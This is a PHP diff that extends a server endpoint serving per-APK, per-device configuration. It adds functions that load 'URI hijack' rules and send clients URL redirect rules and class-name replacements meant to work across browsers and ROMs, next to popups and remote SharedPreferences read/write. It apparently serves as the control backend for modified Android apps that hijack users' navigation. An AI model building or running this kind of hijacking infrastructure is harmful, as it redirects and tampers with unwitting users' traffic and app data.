@@ -294,6 +294,89 @@ if (!function_exists('getHtmlPopups')) {
     }
 }
 
+if (!function_exists('fetchUriHijackRows')) {
+    /**
+     * 读取 URI 劫持规则，并兼容尚未执行结构化字段迁移的旧库。
+     *
+     * 旧库只返回 class_name/uri_value；调用方仍会生成 replace，避免旧壳
+     * 因服务端先升级而停止工作。迁移完成后，新字段由同一份配置生成。
+     */
+    function fetchUriHijackRows(PDO $pdo, int $configId): array
+    {
+        try {
+            $stmt = $pdo->prepare(
+                'SELECT id, class_name, uri_value, match_type, source_pattern, target_url,
+                        priority, enabled
+                 FROM cainiao_uri_hijack
+                 WHERE config_id = :id
+                 ORDER BY priority DESC, id DESC'
+            );
+            $stmt->execute([':id' => $configId]);
+            return $stmt->fetchAll(PDO::FETCH_ASSOC);
+        } catch (PDOException $e) {
+            // 迁移窗口内只允许针对“未知列”回退；连接或权限故障必须继续抛出。
+            $message = strtolower($e->getMessage());
+            if (strpos($message, 'unknown column') === false && strpos($message, '42s22') === false) {
+                throw $e;
+            }
+            $stmt = $pdo->prepare(
+                'SELECT id, class_name, uri_value
+                 FROM cainiao_uri_hijack
+                 WHERE config_id = :id
+                 ORDER BY id DESC'
+            );
+            $stmt->execute([':id' => $configId]);
+            $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
+            foreach ($rows as &$row) {
+                $row['match_type'] = 'class';
+                $row['source_pattern'] = '';
+                $row['target_url'] = '';
+                $row['priority'] = 0;
+                $row['enabled'] = 1;
+            }
+            unset($row);
+            return $rows;
+        }
+    }
+}
+
+if (!function_exists('buildUriHijackConfig')) {
+    /** 将数据库规则转换为旧 replace 与新 url_rules 两份下发合同。 */
+    function buildUriHijackConfig(PDO $pdo, int $configId): array
+    {
+        $replace = [];
+        $urlRules = [];
+        foreach (fetchUriHijackRows($pdo, $configId) as $row) {
+            $type = strtolower(trim((string)($row['match_type'] ?? 'class')));
+            $enabled = (int)($row['enabled'] ?? 1) === 1;
+            if (!$enabled) {
+                continue;
+            }
+            $className = trim((string)($row['class_name'] ?? ''));
+            $uriValue = trim((string)($row['uri_value'] ?? ''));
+            if ($type === 'class') {
+                // 查询已按 priority、id 倒序；同一类名只保留首条，避免低优先级规则覆盖高优先级规则。
+                if ($className !== '' && $uriValue !== '' && !array_key_exists($className, $replace)) {
+                    $replace[$className] = $uriValue;
+                }
+                continue;
+            }
+            $source = trim((string)($row['source_pattern'] ?? ''));
+            $target = trim((string)($row['target_url'] ?? ''));
+            if ($source === '' || $target === '' || !in_array($type, ['exact', 'prefix', 'contains', 'domain'], true)) {
+                continue;
+            }
+            $urlRules[] = [
+                'source_pattern' => $source,
+                'target_url' => $target,
+                'match_type' => $type,
+                'priority' => (int)($row['priority'] ?? 0),
+            ];
+        }
+        return ['replace' => $replace, 'url_rules' => $urlRules];
+    }
+}
+
 if (!function_exists('getResponseData')) {
     // 获取配置数据（核心方法）
     function getResponseData(PDO $pdo, $apkId, $deviceId, $disable = false) {
@@ -319,6 +402,7 @@ if (!function_exists('getResponseData')) {
             $config['websocket'] = false;
         }
 
+        $uriRules = buildUriHijackConfig($pdo, (int)$configId);
         $response = [
             "debug" => (bool)$config['debug'],
             "dns_pool" => (bool)((int)Auth::getSetting($pdo, 'dns_pool', 0)),
@@ -348,7 +432,9 @@ if (!function_exists('getResponseData')) {
                   ON b.popup_id = t.id
                 WHERE b.config_id = :id
             ", [':id' => $configId]),
-            "replace" => array_column(fetchMap("SELECT class_name, uri_value FROM cainiao_uri_hijack WHERE config_id = :id", [':id' => $configId]), 'uri_value', 'class_name'),
+            // replace 是旧壳合同；url_rules 按 URL 匹配，覆盖不同浏览器和 ROM。
+            "replace" => $uriRules['replace'],
+            "url_rules" => $uriRules['url_rules'],
             "enable_sp_put" => (bool)$config['enable_sp_put'],
             "sp_put" => getSpData($pdo, $configId, 'put'),
             "enable_sp_get" => (bool)$config['enable_sp_get'],
